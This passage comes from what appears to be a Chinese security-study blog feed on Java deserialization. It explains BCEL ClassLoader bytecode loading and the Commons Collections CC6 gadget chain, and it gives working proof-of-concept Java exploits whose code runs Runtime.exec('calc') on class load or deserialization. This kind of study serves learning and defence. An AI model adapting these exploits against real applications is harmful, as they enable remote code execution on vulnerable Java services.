class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">        clazz = createClass(class_name);</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">        <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">          clazz = modifyClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">        cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">        cl = Class.forName(class_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)</span><br><span class="line">      resolveClass(cl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="BCEL前因后果的补充-不重要"><a href="#BCEL前因后果的补充-不重要" class="headerlink" title="BCEL前因后果的补充(不重要"></a>BCEL前因后果的补充(不重要</h4><blockquote><p>补充了一个研究的思路：查看更新日志（修复日志），比如java的bugfixes[<a href="https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]">https://www.oracle.com/java/technologies/javase/8u251-bugfixes.html]</a></p></blockquote><ol><li>前因<ol><li><strong>内置在jdk？</strong>: 据p牛（不严谨）的考证，JDK会将BCEL放到自己的代码中，主要原因是为了支撑Java XML相关的功能<ol><li>Java XML功能包含了JAXP规范，而Java中自带的JAXP实现使用了Apache Xerces和Apache Xalan，Apache Xalan又依赖了BCEL，所以BCEL也被放入了标准库中</li></ol></li><li><strong>什么是JAXP</strong>: JAXP全名是Java API for XML Processing，他是Java定义的一系列接口，用于处理XML相关的逻辑(包括DOM、SAX、StAX、XSLT等)。Apache Xalan实现了其中XSLT相关的部分，其中包括xsltc compiler</li><li><strong>什么是XSLT</strong>: XSLT（扩展样式表转换语言）是一种为可扩展置标语言提供表达形式而设计的计算机语言，主要用于将XML转换成其他格式的数据。既然是一门动态“语言”，在Java中必然会先被编译成Java，才能够执行。</li><li><strong>XSLT Compiler</strong>: 是一个命令行编译器，可以<strong>将一个xsl文件编译成一个class文件或jar文件</strong>，编译后的class被称为translet，可以在后续用于对XML文件的转换。 –&gt; <strong>将XSLT的功能转化成了Java代码</strong>，优化执行的速度，如果我们不使用这个命令行编译器进行编译，Java内部也会在运行过程中存在编译的过程</li><li><strong>联系回到AbstactTranslet了</strong>: 之前在TemplatesImpl这条利用链时有使用过，它在defineClass中需要的字节码所对应的基类<ol><li>TemplatesImpl是对JAXP标准中javax.xml.transform.Templates接口的实现，前文说了，XSLT在使用时会先编译成Java字节码，这也就是为什么TemplatesImpl会使用defineClass的原因 –&gt; <strong>将xml等的字节码变成可以使用的类</strong></li></ol></li></ol></li><li>后果<ol><li>bcel依赖中还有ClassLoader，但是java中内置的没有了，应该时有再加工</li></ol></li></ol><h4 id="BCEL-poc"><a href="#BCEL-poc" class="headerlink" title="BCEL poc"></a>BCEL poc</h4><blockquote><p>BCEL是由版本限制的<br>BCEL 在 Java 8u251 及之后的版本中无法使用，这是由于在后续的版本中 com.sun.org.apache.bcel.internal.util.ClassLoader 已被移除</p></blockquote><ol><li>在实例化时调用也可以用静态代码块static来实现，在实例化时自动调用，和<strong>构造函数</strong>效果一样<ol><li>在Java安全3(1)中有提到过static的问题<ol><li>Class.forName()在类加载时就执行static块(可选)</li><li>ClassLoader.loadClas()在加载类时不会执行static块，只会在实例化进行</li></ol></li></ol></li><li>这一个poc的关键是<ol><li>使用到了bcel库中自定义的ClassLoader来进行加载，提供了使用bcel的条件</li><li><code>com.sun.org.apache.bcel.internal.Repository</code>和<code>com.sun.org.apache.bcel.internal.classfile.Utility;</code>这两个库</li><li>逻辑：其中 Utility.encode 方法用于将字节数组编码为一个字符串表示形式，如果接受的第二个参数为 true，则会先对字节数组进行 gzip 压缩，然后再进行编码为字符串形式。最后使用bcel的ClassLoader加载类，并实例化触发静态块</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// BCELPayload.java 这里需要加入包的标识才可以，可以子本地进行lookup</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELPayload</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// BCELrce.java poc</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELrce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">JavaClass</span> <span class="variable">jcls</span> <span class="operator">=</span> Repository.lookupClass(BCELPayload.class);</span><br><span class="line">            <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(jcls.getBytes(), <span class="literal">true</span>);</span><br><span class="line">            System.out.println(code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>java安全漫谈</li><li><a href="https://0xf4n9x.github.io/java-classloader.html">专门找的博客还是比较对口</a></li><li><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/%5BJava%E5%AE%89%E5%85%A8%5D%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E5%AD%A6%E4%B9%A0.md">还是信工所大佬</a></li><li><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">p牛 becl</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全5(5)_CC6</title>
      <link href="/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/"/>
      <url>/2024/11/17/Java%E5%AE%89%E5%85%A85(5)_CC6/</url>
      
        <content type="html"><![CDATA[<h2 id="高版本的CC链利用解决方案-CC6"><a href="#高版本的CC链利用解决方案-CC6" class="headerlink" title="高版本的CC链利用解决方案:CC6"></a>高版本的CC链利用解决方案:CC6</h2><blockquote><p>在Java 8u71版本以后，CC1的两条利⽤链就不能再被利⽤了，主要原因是内置类方法 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了，无法调用到给定的map的方法而是自己创建了一个linkedxxxMap<br>CC6则是一条可以在高版本利用的一条反序列化链子: 利⽤链可以在Java 7和8的⾼版本触发，没有版本限制</p></blockquote><h2 id="CC6构造分析"><a href="#CC6构造分析" class="headerlink" title="CC6构造分析"></a>CC6构造分析</h2><h3 id="Gadget-Chain"><a href="#Gadget-Chain" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><blockquote><p>CC6的构造也是基于LazyMap的，是在CC1基础上拓展出来的</p></blockquote><ol><li>分析一下链子再跟着去看源码<ol><li>看一下下面TiedMapEntry这一个类，结合调用链分析就容易理解了(注意基于CC1而来)</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line"> java.io.ObjectInputStream.readObject()</span><br><span class="line">    java.util.HashMap.readObject()</span><br><span class="line">        java.util.HashMap.<span class="built_in">hash</span>()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                    org.apache.commons.collections.functors.ChainedTransformeretransform()</span><br><span class="line">                        org.apacheecommons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                            java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure><h3 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h3><ol><li><p>审计一下，知道总体来说就是一个新的map实体而已，这里没什么特殊</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A Map Entry tied to a map underneath.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This can be used to enable a map entry to make changes on the underlying</span></span><br><span class="line"><span class="comment"> * map, however this will probably mess up any iterators.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.5 $ $Date: 2004/04/09 14:35:10 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点看看hashCode()方法和getXXX()方法</p><ol><li>重点在于<code>getValue()</code>，因为这里会调用到<code>map.get(key)</code>，可以<strong>调用到LazyMap中的get到<code>transform()</code></strong></li><li>又注意到<code>hashCode()</code>方法中会调用到<code>getValue()</code>方法，也是ok</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the key of this entry</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the key</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets the value of this entry direct from the map.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the value</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Gets a hashCode compatible with the equals method.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Implemented per API documentation of &#123;<span class="doctag">@link</span> java.util.Map.Entry#hashCode()&#125;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> a suitable hash code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="什么是Map-Entry"><a href="#什么是Map-Entry" class="headerlink" title="什么是Map.Entry?"></a>什么是Map.Entry?</h3><ol><li>Map.Entry与Map的关系<ol><li>Map.Entry 接口表示 Map 中的一个条目，即一个键值对。它是 Map 接口中定义的一个静态内部接口。通过 Map.entrySet() 方法可以获取到一个包含所有条目的集合视图，该集合中的每个元素都是一个 Map.Entry 实例</li><li>再idea的debug视图中可以看到<ol><li><img src="/pic/Java%E5%AE%89%E5%85%A85(5)_CC6/MapEntry.png" alt="debug"></li></ol></li></ol></li><li><em><strong>Map.Entry和Map是连接在一起的，但是Map.Entry中的key可以单独存在</strong></em></li></ol><h3 id="我的CC6"><a href="#我的CC6" class="headerlink" title="我的CC6"></a>我的CC6</h3><h4 id="CC6-poc-KC1zs4"><a href="#CC6-poc-KC1zs4" class="headerlink" title="CC6 poc KC1zs4"></a>CC6 poc KC1zs4</h4><ol><li><p>这里先自己从利用链推一下</p><ol><li><p>那就要调用到tme对象的hashCode()方法，想起老朋友HashMap()(readObject()也是可以的)，再回去看</p></li><li><p>嗯可以，看继承关系hashCode()方法是有各个map实现类处理的，HashMap有下面这段，只需要值或者value是一个tme对象就好</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (key==<span class="literal">null</span>   ? <span class="number">0</span> : key.hashCode()) ^</span><br><span class="line">           (value==<span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>总结一下要求</p><ol><li>要求1：将tme对象放到HashMap()中</li><li>要求2：将tme对象的map变为lazyMap+payload</li><li>补一下：对tme对象调用hash会进入内部hashCode在对最底层的map进行处理</li></ol></li><li><p><em><strong>构造poc如下</strong></em></p><ol><li>接下来解读一下逻辑</li></ol><blockquote><p>自己写后参考p牛版本<br>这里有一个小坑点见下Q，可以调试一下来解决&#x2F;逻辑判断一下<br>下面这段poc确实是需要readObject()才会进行触发的</p></blockquote></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        poc();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">poc</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 1. payload * * * * * */</span></span><br><span class="line">            <span class="comment">// 依照思路是要给lazymap的转换器的</span></span><br><span class="line">            Transformer[] transformers = &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="comment">// 到这里才调用了getRuntime()获取了对应的对象</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">                    , <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 构造lazyMap * * * * * */</span></span><br><span class="line">            <span class="comment">// 先不加transformer，后面反射再加，防止提前触发，这里是占位</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Map</span> <span class="variable">myLazyMap</span> <span class="operator">=</span> LazyMap.decorate(myMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;placeholder&quot;</span>));</span><br><span class="line">            myLazyMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>); <span class="comment">// 这里无事发生，不会调用转换器，transformedMap才会在put调用</span></span><br><span class="line">            <span class="type">TiedMapEntry</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(myLazyMap, <span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 构造反序列化对象HashMap * * * * * */</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">deserMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            deserMap.put(triggerObj,<span class="string">&quot;value1&quot;</span>);</span><br><span class="line">                <span class="comment">// 就是这里的put调用了key的hashCode()方法先进行了一次添加，添加到了最底层的myMap中</span></span><br><span class="line">                <span class="comment">// 调用了lazyMap中的transform方法</span></span><br><span class="line">                <span class="comment">// 这里还要注意需要放在key这里，因为lazyMap中transform是对key的</span></span><br><span class="line">            myLazyMap.remove(<span class="string">&quot;key1&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 4. 反射加入payload * * * * * */</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(myLazyMap,payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 5. 模拟反序列化 * * * * * */</span></span><br><span class="line">            <span class="comment">// 序列化</span></span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">            oos.writeObject(deserMap);</span><br><span class="line">            oos.close();</span><br><span class="line">            <span class="comment">// 反序列化</span></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Q-为什么payload最后再加入"><a href="#Q-为什么payload最后再加入" class="headerlink" title="Q: 为什么payload最后再加入?"></a>Q: 为什么payload最后再加入?</h4><ol><li><p>防止中途被调用的情况</p></li><li><p>p牛的处理方式</p><ol><li>对transformerChain的指向而不是直接LazyMap中的factory</li><li><em><strong>很妙的思想</strong></em>: 既然factory是final，那我可以不改变他的指向，而是<strong>改变他指向的指向</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(transformerChain, transformers);</span><br></pre></td></tr></table></figure></li><li><p>我的处理方式</p><ol><li>直接对属性进行设置，<em><strong>经过实验也是可以直接对<code>protected final</code>使用反射进行修改</strong></em></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReflectFinalTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> String myName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReflectFinalTest</span><span class="params">()</span> &#123;</span><br><span class="line">        myName = <span class="string">&quot;KC1zs4&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        test();</span><br><span 